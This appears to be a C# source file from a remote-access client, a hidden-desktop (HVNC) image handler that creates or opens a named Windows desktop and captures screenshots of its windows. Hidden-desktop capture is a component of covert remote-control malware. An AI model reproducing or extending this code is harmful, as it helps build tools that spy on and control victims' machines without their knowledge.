using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Pulsar.Client.Helper.HVNC
{
    internal class ImageHandler
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindowType uCmd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetTopWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        public ImageHandler(string DesktopName)
        {
            IntPtr intPtr = OpenDesktop(DesktopName, 0, true, 511U);
            if (intPtr == IntPtr.Zero)
            {
                intPtr = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, 511U, IntPtr.Zero);
            }
            this.Desktop = intPtr;
        }

        private static float GetScalingFactor()
        {
            float result;
            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr hdc = graphics.GetHdc();
                int deviceCaps = GetDeviceCaps(hdc, 10);
                result = (float)GetDeviceCaps(hdc, 117) / (float)deviceCaps;
                graphics.ReleaseHdc(hdc);
            }
            return result;
        }

        private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC, float scalingFactor, Rectangle captureArea)
        {
            bool result = false;
            RECT rect;
            GetWindowRect(hWnd, out rect);

            // Only draw if window is within the capture area
            if (rect.Right < captureArea.Left || rect.Left > captureArea.Right ||
                rect.Bottom < captureArea.Top || rect.Top > captureArea.Bottom)
            {
                return false;
            }

            IntPtr intPtr = CreateCompatibleDC(DC);
            IntPtr intPtr2 = CreateCompatibleBitmap(DC, (int)((float)(rect.Right - rect.Left) * scalingFactor), (int)((float)(rect.Bottom - rect.Top) * scalingFactor));
            SelectObject(intPtr, intPtr2);
            uint nFlags = 2U;
            if (PrintWindow(hWnd, intPtr, nFlags))
            {
                try
                {
                    Bitmap bitmap = Image.FromHbitmap(intPtr2);
                    // Adjust draw position relative to capture area
                    ModifiableScreen.DrawImage(bitmap, new Point(rect.Left - captureArea.Left, rect.Top - captureArea.Top));
                    bitmap.Dispose();
                    result = true;
                }
                catch
                {
                }
            }
            DeleteObject(intPtr2);
            DeleteDC(intPtr);
            return result;
        }

        private void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC, float scalingFactor, Rectangle captureArea)
        {
            IntPtr intPtr = GetTopWindow(owner);
            if (intPtr == IntPtr.Zero)
            {
                return;
            }
            intPtr = GetWindow(intPtr, GetWindowType.GW_HWNDLAST);
            if (intPtr == IntPtr.Zero)
            {
                return;
            }
            while (intPtr != IntPtr.Zero)
            {
                this.DrawHwnd(intPtr, ModifiableScreen, DC, scalingFactor, captureArea);
                intPtr = GetWindow(intPtr, GetWindowType.GW_HWNDPREV);
            }
        }

        private void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC, float scalingFactor, Rectangle captureArea)
        {
            if (IsWindowVisible(hWnd))
            {
                this.DrawApplication(hWnd, ModifiableScreen, DC, scalingFactor, captureArea);
                if (Environment.OSVersion.Version.Major < 6)
                {
                    this.DrawTopDown(hWnd, ModifiableScreen, DC, scalingFactor, captureArea);
                }
            }
        }

        public void Dispose()
        {
            CloseDesktop(this.Desktop);
            GC.Collect();
        }

        /// <summary>
        /// Gets the total number of monitors available.
        /// </summary>
        /// <returns>The number of monitors.</returns>
        public static int GetMonitorCount()
        {
            return Screen.AllScreens.Length;
        }

        /// <summary>
        /// Captures the screenshot of the entire desktop (all monitors).
        /// </summary>
        public Bitmap Screenshot()
        {
            return Screenshot(-1); // -1 means capture all monitors
        }

        /// <summary>
        /// Captures the screenshot of a specific monitor.
        /// </summary>
        /// <param name="monitorIndex">The index of the monitor to capture. Use -1 to capture all monitors.</param>
        public Bitmap Screenshot(int monitorIndex)
        {
            SetThreadDesktop(this.Desktop);
            IntPtr dc = GetDC(IntPtr.Zero);

            Rectangle captureArea;

            if (monitorIndex >= 0 && monitorIndex < Screen.AllScreens.Length)
            {
                // Capture specific monitor
                captureArea = Screen.AllScreens[monitorIndex].Bounds;
            }
            else
            {
                // Capture all monitors (entire desktop)
                RECT rect;
                GetWindowRect(GetDesktopWindow(), out rect);
                captureArea = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
            }

            float scalingFactor = GetScalingFactor();
            int scaledWidth = (int)((float)captureArea.Width * scalingFactor);
            int scaledHeight = (int)((float)captureArea.Height * scalingFactor);

            Bitmap bitmap = new Bitmap(scaledWidth, scaledHeight);
            try
            {
                using (Graphics graphics = Graphics.FromImage(bitmap))
                {
                    this.DrawTopDown(IntPtr.Zero, graphics, dc, scalingFactor, captureArea);
                }
            }
            finally
            {
                ReleaseDC(IntPtr.Zero, dc);
            }
            return bitmap;
        }

        public IntPtr Desktop = IntPtr.Zero;

        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        private struct RECT
        {
            public int Left;

            public int Top;

            public int Right;

            public int Bottom;
        }

        private enum GetWindowType : uint
        {
            GW_HWNDFIRST,
            GW_HWNDLAST,
            GW_HWNDNEXT,
            GW_HWNDPREV,
            GW_OWNER,
            GW_CHILD,
            GW_ENABLEDPOPUP
        }

        private enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }
    }
}